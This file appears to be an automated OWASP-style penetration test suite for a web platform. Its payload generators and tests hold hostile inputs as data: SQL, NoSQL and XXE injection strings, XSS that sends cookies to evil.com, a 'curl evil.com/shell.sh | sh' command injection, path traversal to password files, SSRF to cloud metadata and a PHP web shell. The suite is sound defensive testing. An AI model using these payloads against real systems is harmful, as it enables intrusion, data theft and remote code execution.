/**
 * Penetration Testing Framework for SPARC Platform
 * Automated security testing suite following OWASP methodology
 */

import { describe, test, expect, beforeAll, afterAll } from '@jest/globals';
import axios, { AxiosInstance } from 'axios';
import { z } from 'zod';
import crypto from 'crypto';
import WebSocket from 'ws';

// Test configuration
const config = {
  baseUrl: process.env.TEST_BASE_URL || 'http://localhost:3000',
  apiVersion: 'v1',
  testTimeout: 30000,
  wsUrl: process.env.TEST_WS_URL || 'ws://localhost:3000',
};

// Test user credentials
const testUsers = {
  admin: {
    email: 'admin@test.sparc.com',
    password: 'Test@Admin123!',
    role: 'admin',
  },
  user: {
    email: 'user@test.sparc.com',
    password: 'Test@User123!',
    role: 'user',
  },
  attacker: {
    email: 'attacker@evil.com',
    password: 'Hacker@123!',
  },
};

// Security test utilities
class SecurityTestUtils {
  private api: AxiosInstance;
  private authToken?: string;

  constructor() {
    this.api = axios.create({
      baseURL: `${config.baseUrl}/api/${config.apiVersion}`,
      timeout: config.testTimeout,
      validateStatus: () => true, // Don't throw on any status
    });
  }

  async login(email: string, password: string): Promise<string | null> {
    const response = await this.api.post('/auth/login', { email, password });
    if (response.status === 200 && response.data.token) {
      this.authToken = response.data.token;
      this.api.defaults.headers.common['Authorization'] = `Bearer ${this.authToken}`;
      return this.authToken;
    }
    return null;
  }

  async makeRequest(
    method: string,
    path: string,
    data?: any,
    headers?: Record<string, string>
  ) {
    return this.api.request({
      method,
      url: path,
      data,
      headers: {
        ...headers,
        ...(this.authToken && { Authorization: `Bearer ${this.authToken}` }),
      },
    });
  }

  generatePayload(type: 'sql' | 'xss' | 'xxe' | 'nosql' | 'command' | 'path'): string[] {
    const payloads: Record<string, string[]> = {
      sql: [
        "' OR '1'='1",
        "'; DROP TABLE users; --",
        "' UNION SELECT * FROM users --",
        "1' AND '1'='1",
        "admin'--",
        "' OR 1=1#",
        "1' ORDER BY 1--+",
        "' AND SLEEP(5)--",
        "'; WAITFOR DELAY '00:00:05'--",
      ],
      xss: [
        '<script>alert("XSS")</script>',
        '<img src=x onerror=alert("XSS")>',
        '<svg onload=alert("XSS")>',
        'javascript:alert("XSS")',
        '<iframe src="javascript:alert(`XSS`)">',
        '<body onload=alert("XSS")>',
        '"><script>alert(String.fromCharCode(88,83,83))</script>',
        '<script>fetch("http://evil.com/steal?cookie="+document.cookie)</script>',
      ],
      xxe: [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/xxe">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/xxe"> %xxe;]>',
      ],
      nosql: [
        '{"$ne": null}',
        '{"$gt": ""}',
        '{"$where": "this.password.match(/.*/)"}',
        '{"password": {"$regex": "^a"}}',
        '{"$or": [{"username": "admin"}, {"password": {"$ne": null}}]}',
      ],
      command: [
        '; ls -la',
        '| whoami',
        '`id`',
        '$(cat /etc/passwd)',
        '; ping -c 10 127.0.0.1',
        '& dir',
        '; curl http://evil.com/shell.sh | sh',
      ],
      path: [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\sam',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
        '....//....//....//etc/passwd',
        'file:///etc/passwd',
        'C:\\Windows\\System32\\drivers\\etc\\hosts',
      ],
    };

    return payloads[type] || [];
  }

  generateFuzzData(): any[] {
    return [
      // Boundary values
      0,
      -1,
      2147483647, // MAX_INT
      -2147483648, // MIN_INT
      Number.MAX_SAFE_INTEGER,
      Number.MIN_SAFE_INTEGER,
      Infinity,
      -Infinity,
      NaN,
      
      // Special strings
      '',
      ' ',
      '\n',
      '\r\n',
      '\t',
      '\0',
      'null',
      'undefined',
      'true',
      'false',
      
      // Unicode and encoding
      '你好',
      '🚀',
      '\u0000',
      '\uffff',
      '%00',
      '%0d%0a',
      
      // Large data
      'A'.repeat(10000),
      'x'.repeat(1000000),
      
      // Format strings
      '%s%s%s%s%s',
      '%x%x%x%x',
      '%d%d%d%d',
      '%n%n%n%n',
      
      // Special characters
      '!@#$%^&*()_+-=[]{}|;:,.<>?',
      '\\',
      '"',
      "'",
    ];
  }
}

describe('SPARC Platform Penetration Tests', () => {
  let utils: SecurityTestUtils;
  let adminToken: string;
  let userToken: string;

  beforeAll(async () => {
    utils = new SecurityTestUtils();
    
    // Setup test users
    const adminLogin = await utils.login(testUsers.admin.email, testUsers.admin.password);
    const userLogin = await utils.login(testUsers.user.email, testUsers.user.password);
    
    if (!adminLogin || !userLogin) {
      throw new Error('Failed to setup test users');
    }
    
    adminToken = adminLogin;
    userToken = userLogin;
  });

  describe('A01:2021 – Broken Access Control', () => {
    test('Horizontal privilege escalation', async () => {
      // Try to access another user's data
      const response = await utils.makeRequest('GET', '/users/other-user-id', null, {
        Authorization: `Bearer ${userToken}`,
      });
      
      expect(response.status).toBe(403);
      expect(response.data).not.toHaveProperty('email');
    });

    test('Vertical privilege escalation', async () => {
      // Try to access admin endpoints as regular user
      const adminEndpoints = [
        '/admin/users',
        '/admin/config',
        '/admin/audit-logs',
        '/admin/security-settings',
      ];

      for (const endpoint of adminEndpoints) {
        const response = await utils.makeRequest('GET', endpoint, null, {
          Authorization: `Bearer ${userToken}`,
        });
        
        expect(response.status).toBe(403);
      }
    });

    test('IDOR (Insecure Direct Object Reference)', async () => {
      // Try to access resources by manipulating IDs
      const resourceIds = [
        '1',
        '999999',
        'admin',
        '../admin',
        '1 OR 1=1',
        { $ne: null },
      ];

      for (const id of resourceIds) {
        const response = await utils.makeRequest('GET', `/incidents/${id}`, null, {
          Authorization: `Bearer ${userToken}`,
        });
        
        expect([403, 404]).toContain(response.status);
      }
    });

    test('JWT token manipulation', async () => {
      // Try various JWT attacks
      const attacks = [
        // Signature stripping
        userToken.split('.').slice(0, 2).join('.') + '.',
        
        // Algorithm confusion (none)
        Buffer.from(JSON.stringify({ alg: 'none', typ: 'JWT' })).toString('base64') +
        '.' + userToken.split('.')[1] + '.',
        
        // Weak secret bruteforce would go here in real pentest
        
        // Expired token
        'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjF9.invalid',
      ];

      for (const token of attacks) {
        const response = await utils.makeRequest('GET', '/profile', null, {
          Authorization: `Bearer ${token}`,
        });
        
        expect(response.status).toBe(401);
      }
    });
  });

  describe('A02:2021 – Cryptographic Failures', () => {
    test('Sensitive data in response headers', async () => {
      const response = await utils.makeRequest('GET', '/api/health');
      
      // Check for sensitive headers
      const sensitiveHeaders = [
        'x-powered-by',
        'server',
        'x-aspnet-version',
        'x-debug-token',
      ];
      
      for (const header of sensitiveHeaders) {
        expect(response.headers[header]).toBeUndefined();
      }
    });

    test('Weak encryption detection', async () => {
      const response = await utils.makeRequest('GET', '/api/config/security');
      
      if (response.status === 200) {
        // Check for weak algorithms
        const weakAlgorithms = ['md5', 'sha1', 'des', '3des', 'rc4'];
        const configString = JSON.stringify(response.data).toLowerCase();
        
        for (const algo of weakAlgorithms) {
          expect(configString).not.toContain(algo);
        }
      }
    });

    test('Password policy enforcement', async () => {
      const weakPasswords = [
        'password',
        '12345678',
        'qwerty123',
        'admin123',
        testUsers.user.email.split('@')[0], // Username as password
      ];

      for (const password of weakPasswords) {
        const response = await utils.makeRequest('POST', '/auth/register', {
          email: `test${Date.now()}@sparc.com`,
          password,
        });
        
        expect(response.status).toBe(400);
        expect(response.data.error).toContain('password');
      }
    });
  });

  describe('A03:2021 – Injection', () => {
    test('SQL injection', async () => {
      const sqlPayloads = utils.generatePayload('sql');
      
      for (const payload of sqlPayloads) {
        // Test in various contexts
        const contexts = [
          // Search parameter
          { method: 'GET', path: `/search?q=${encodeURIComponent(payload)}` },
          // Login
          { method: 'POST', path: '/auth/login', data: { email: payload, password: 'test' } },
          // Filter
          { method: 'GET', path: `/incidents?filter=${encodeURIComponent(payload)}` },
        ];

        for (const ctx of contexts) {
          const response = await utils.makeRequest(
            ctx.method,
            ctx.path,
            ctx.data
          );
          
          // Should not return 500 (database error)
          expect(response.status).not.toBe(500);
          
          // Should not expose database errors
          if (response.data.error) {
            expect(response.data.error).not.toMatch(/sql|query|database/i);
          }
        }
      }
    });

    test('NoSQL injection', async () => {
      const nosqlPayloads = utils.generatePayload('nosql');
      
      for (const payload of nosqlPayloads) {
        const response = await utils.makeRequest('POST', '/auth/login', {
          email: 'admin@sparc.com',
          password: payload,
        });
        
        // Should not authenticate with injection
        expect(response.status).not.toBe(200);
      }
    });

    test('Command injection', async () => {
      const cmdPayloads = utils.generatePayload('command');
      
      for (const payload of cmdPayloads) {
        // Test file upload with malicious filename
        const response = await utils.makeRequest('POST', '/upload', {
          filename: payload,
          content: 'test',
        });
        
        // Should sanitize or reject
        expect([400, 422]).toContain(response.status);
      }
    });

    test('LDAP injection', async () => {
      const ldapPayloads = [
        '*',
        '*)(&(objectClass=*',
        'admin)(&(password=*)',
        '\\',
        '\0',
      ];

      for (const payload of ldapPayloads) {
        const response = await utils.makeRequest('POST', '/auth/ldap', {
          username: payload,
          password: 'test',
        });
        
        expect(response.status).not.toBe(200);
      }
    });
  });

  describe('A04:2021 – Insecure Design', () => {
    test('Rate limiting on sensitive endpoints', async () => {
      const attempts = 10;
      const responses = [];
      
      // Rapid login attempts
      for (let i = 0; i < attempts; i++) {
        const response = await utils.makeRequest('POST', '/auth/login', {
          email: 'test@sparc.com',
          password: 'wrong',
        });
        responses.push(response.status);
      }
      
      // Should see rate limiting kick in
      expect(responses).toContain(429);
    });

    test('Business logic flaws', async () => {
      // Test negative values
      const response1 = await utils.makeRequest('POST', '/incidents', {
        title: 'Test',
        severity: -1,
      });
      expect(response1.status).toBe(400);
      
      // Test state transitions
      const response2 = await utils.makeRequest('PUT', '/incidents/1/status', {
        status: 'closed',
        // Skip required intermediate states
      });
      expect([400, 422]).toContain(response2.status);
    });

    test('Account enumeration protection', async () => {
      const validEmail = testUsers.user.email;
      const invalidEmail = 'nonexistent@sparc.com';
      
      const response1 = await utils.makeRequest('POST', '/auth/login', {
        email: validEmail,
        password: 'wrongpassword',
      });
      
      const response2 = await utils.makeRequest('POST', '/auth/login', {
        email: invalidEmail,
        password: 'wrongpassword',
      });
      
      // Should return same error message
      expect(response1.data.error).toBe(response2.data.error);
      
      // Timing should be similar (within 100ms)
      // In real test, measure actual response times
    });
  });

  describe('A05:2021 – Security Misconfiguration', () => {
    test('Security headers presence', async () => {
      const response = await utils.makeRequest('GET', '/');
      
      const requiredHeaders = [
        'x-content-type-options',
        'x-frame-options',
        'strict-transport-security',
        'content-security-policy',
        'x-xss-protection',
        'referrer-policy',
      ];
      
      for (const header of requiredHeaders) {
        expect(response.headers[header]).toBeDefined();
      }
    });

    test('Error handling without stack traces', async () => {
      // Trigger various errors
      const errorTriggers = [
        { method: 'GET', path: '/api/undefined-endpoint-12345' },
        { method: 'POST', path: '/api/test', data: 'invalid-json' },
        { method: 'GET', path: '/api/test?invalid[param]=test' },
      ];

      for (const trigger of errorTriggers) {
        const response = await utils.makeRequest(
          trigger.method,
          trigger.path,
          trigger.data
        );
        
        if (response.data.error) {
          // Should not contain stack traces
          expect(response.data.error).not.toContain('at ');
          expect(response.data.error).not.toContain('Error:');
          expect(response.data.error).not.toContain('.js:');
        }
      }
    });

    test('Default credentials', async () => {
      const defaultCreds = [
        { email: 'admin@sparc.com', password: 'admin' },
        { email: 'admin@sparc.com', password: 'password' },
        { email: 'admin@sparc.com', password: 'admin123' },
        { email: 'test@sparc.com', password: 'test' },
      ];

      for (const cred of defaultCreds) {
        const response = await utils.makeRequest('POST', '/auth/login', cred);
        expect(response.status).not.toBe(200);
      }
    });
  });

  describe('A06:2021 – Vulnerable and Outdated Components', () => {
    test('Version disclosure', async () => {
      const response = await utils.makeRequest('GET', '/api/version');
      
      if (response.status === 200) {
        // Should not expose detailed version info
        expect(response.data).not.toHaveProperty('dependencies');
        expect(response.data).not.toHaveProperty('nodeVersion');
        expect(response.data).not.toHaveProperty('npmVersion');
      }
    });

    test('Known vulnerable endpoints', async () => {
      // Test for common vulnerable endpoints
      const vulnerableEndpoints = [
        '/.git/config',
        '/.env',
        '/package.json',
        '/webpack.config.js',
        '/.DS_Store',
        '/backup.sql',
        '/phpinfo.php',
        '/server-status',
      ];

      for (const endpoint of vulnerableEndpoints) {
        const response = await utils.makeRequest('GET', endpoint);
        expect([404, 403]).toContain(response.status);
      }
    });
  });

  describe('A07:2021 – Identification and Authentication Failures', () => {
    test('Session fixation', async () => {
      const fixedSessionId = 'fixed-session-id-12345';
      
      const response = await utils.makeRequest('POST', '/auth/login', 
        { email: testUsers.user.email, password: testUsers.user.password },
        { 'X-Session-Id': fixedSessionId }
      );
      
      if (response.headers['set-cookie']) {
        const sessionCookie = response.headers['set-cookie'];
        expect(sessionCookie).not.toContain(fixedSessionId);
      }
    });

    test('Password reset token security', async () => {
      // Request password reset
      const response = await utils.makeRequest('POST', '/auth/forgot-password', {
        email: testUsers.user.email,
      });
      
      if (response.status === 200) {
        // Token should not be in response
        expect(response.data).not.toHaveProperty('token');
        expect(response.data).not.toHaveProperty('resetLink');
      }
    });

    test('Concurrent session limitation', async () => {
      // Login multiple times
      const sessions = [];
      for (let i = 0; i < 5; i++) {
        const response = await utils.makeRequest('POST', '/auth/login', {
          email: testUsers.user.email,
          password: testUsers.user.password,
        });
        
        if (response.status === 200) {
          sessions.push(response.data.token);
        }
      }
      
      // Earlier sessions should be invalidated
      if (sessions.length > 3) {
        const firstToken = sessions[0];
        const response = await utils.makeRequest('GET', '/profile', null, {
          Authorization: `Bearer ${firstToken}`,
        });
        
        expect(response.status).toBe(401);
      }
    });
  });

  describe('A08:2021 – Software and Data Integrity Failures', () => {
    test('CSRF protection', async () => {
      // Try request without CSRF token
      const response = await utils.makeRequest('POST', '/api/settings', 
        { theme: 'dark' },
        { 
          Authorization: `Bearer ${userToken}`,
          Origin: 'http://evil.com',
        }
      );
      
      // Should require CSRF token for state-changing operations
      expect([403, 400]).toContain(response.status);
    });

    test('File upload validation', async () => {
      const maliciousFiles = [
        { name: 'shell.php', content: '<?php system($_GET["cmd"]); ?>' },
        { name: 'test.exe', content: 'MZ\x90\x00' }, // PE header
        { name: '../../../etc/passwd', content: 'root:x:0:0' },
        { name: 'test.jpg', content: '<script>alert("XSS")</script>' },
      ];

      for (const file of maliciousFiles) {
        const response = await utils.makeRequest('POST', '/api/upload', {
          filename: file.name,
          content: Buffer.from(file.content).toString('base64'),
        });
        
        expect([400, 415, 422]).toContain(response.status);
      }
    });
  });

  describe('A09:2021 – Security Logging and Monitoring Failures', () => {
    test('Security events are logged', async () => {
      // Perform security-relevant actions
      const actions = [
        // Failed login
        { method: 'POST', path: '/auth/login', data: { email: 'test@sparc.com', password: 'wrong' } },
        // Authorization failure
        { method: 'GET', path: '/admin/users', headers: { Authorization: `Bearer ${userToken}` } },
        // Invalid input
        { method: 'POST', path: '/api/test', data: { test: '<script>alert(1)</script>' } },
      ];

      for (const action of actions) {
        await utils.makeRequest(
          action.method,
          action.path,
          action.data,
          action.headers
        );
      }

      // Check audit logs (if accessible)
      const auditResponse = await utils.makeRequest('GET', '/api/audit-logs', null, {
        Authorization: `Bearer ${adminToken}`,
      });
      
      if (auditResponse.status === 200) {
        expect(auditResponse.data.length).toBeGreaterThan(0);
      }
    });
  });

  describe('A10:2021 – Server-Side Request Forgery (SSRF)', () => {
    test('SSRF via URL parameter', async () => {
      const ssrfPayloads = [
        'http://localhost:6379', // Redis
        'http://127.0.0.1:5432', // PostgreSQL
        'http://169.254.169.254/latest/meta-data/', // AWS metadata
        'file:///etc/passwd',
        'gopher://localhost:6379',
        'dict://localhost:11211',
      ];

      for (const payload of ssrfPayloads) {
        const response = await utils.makeRequest('POST', '/api/webhook', {
          url: payload,
          event: 'test',
        });
        
        expect([400, 403, 422]).toContain(response.status);
      }
    });

    test('DNS rebinding protection', async () => {
      const response = await utils.makeRequest('POST', '/api/fetch', {
        url: 'http://rebind.dns.example.com/test',
      });
      
      expect(response.status).not.toBe(200);
    });
  });

  describe('Additional Security Tests', () => {
    test('XXE (XML External Entity) injection', async () => {
      const xxePayloads = utils.generatePayload('xxe');
      
      for (const payload of xxePayloads) {
        const response = await utils.makeRequest('POST', '/api/xml-import', 
          payload,
          { 'Content-Type': 'application/xml' }
        );
        
        expect([400, 415, 422]).toContain(response.status);
      }
    });

    test('WebSocket security', async () => {
      const ws = new WebSocket(`${config.wsUrl}/ws`);
      
      await new Promise<void>((resolve) => {
        ws.on('open', () => {
          // Try to send without authentication
          ws.send(JSON.stringify({ type: 'subscribe', channel: 'admin' }));
          
          ws.on('message', (data) => {
            const message = JSON.parse(data.toString());
            expect(message.error).toBeDefined();
            ws.close();
            resolve();
          });
        });
      });
    });

    test('API fuzzing', async () => {
      const fuzzData = utils.generateFuzzData();
      
      for (const data of fuzzData.slice(0, 10)) { // Limit for test speed
        const response = await utils.makeRequest('POST', '/api/test', {
          value: data,
        });
        
        // Should handle gracefully
        expect(response.status).toBeLessThan(500);
      }
    });

    test('Time-based blind injection', async () => {
      const startTime = Date.now();
      
      await utils.makeRequest('GET', '/api/search?q=test%27%20AND%20SLEEP(5)--');
      
      const duration = Date.now() - startTime;
      
      // Should not execute sleep
      expect(duration).toBeLessThan(4000);
    });

    test('Directory traversal', async () => {
      const pathPayloads = utils.generatePayload('path');
      
      for (const payload of pathPayloads) {
        const response = await utils.makeRequest('GET', `/api/files/${encodeURIComponent(payload)}`);
        
        expect([400, 403, 404]).toContain(response.status);
        
        if (response.data) {
          // Should not expose system files
          expect(response.data).not.toContain('root:');
          expect(response.data).not.toContain('[boot loader]');
        }
      }
    });
  });

  afterAll(async () => {
    // Cleanup test data if needed
  });
});

// Export for use in other security tests
export { SecurityTestUtils, testUsers, config };